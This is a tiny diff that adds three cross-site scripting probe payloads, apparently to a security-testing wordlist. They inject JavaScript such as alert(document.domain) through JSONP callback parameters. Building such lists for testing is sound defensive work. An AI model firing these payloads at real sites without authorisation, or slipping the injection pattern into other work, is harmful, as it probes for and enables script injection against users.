@@ -1,0 +1,3 @@
+?callback=alert(1)
+?jsonp=alert(1)
+?cb=alert(document.domain)
